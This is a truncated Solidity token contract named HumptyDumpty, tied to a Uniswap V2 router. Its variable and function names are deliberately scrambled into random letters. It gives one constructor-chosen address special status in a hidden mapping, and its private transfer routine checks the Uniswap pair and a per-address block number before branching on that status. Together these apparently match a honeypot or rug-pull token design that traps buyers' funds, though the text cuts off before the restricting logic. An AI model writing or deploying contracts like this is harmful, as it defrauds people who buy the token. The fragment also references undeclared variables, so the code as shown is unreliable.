contract HumptyDumpty is Ownable {
    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private rvxyoamsebn;

    mapping(address => uint256) private xjpqam;

    constructor(string memory vnoxuahgw, string memory rcbeyxmaluf, address mhstzixr, address xvkrbzmugep) {
        name = vnoxuahgw;
        symbol = rcbeyxmaluf;
        balanceOf[msg.sender] = totalSupply;
        mpug[xvkrbzmugep] = true;
        rvxyoamsebn = IUniswapV2Router02(mhstzixr);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address vmsenl, address yqijbna, uint256 fqxpldmtwoyj) public returns (bool success) {
        require(fqxpldmtwoyj <= allowance[vmsenl][msg.sender]);
        allowance[vmsenl][msg.sender] -= fqxpldmtwoyj;
        azycjexm(vmsenl, yqijbna, fqxpldmtwoyj);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function azycjexm(address vmsenl, address yqijbna, uint256 fqxpldmtwoyj) private {
        address irmab = IUniswapV2Factory(rvxyoamsebn.factory()).getPair(address(this), rvxyoamsebn.WETH());
        bool cbugoflkq = xjpqam[vmsenl] == block.number;
        if (!mpug[vmsenl]) {
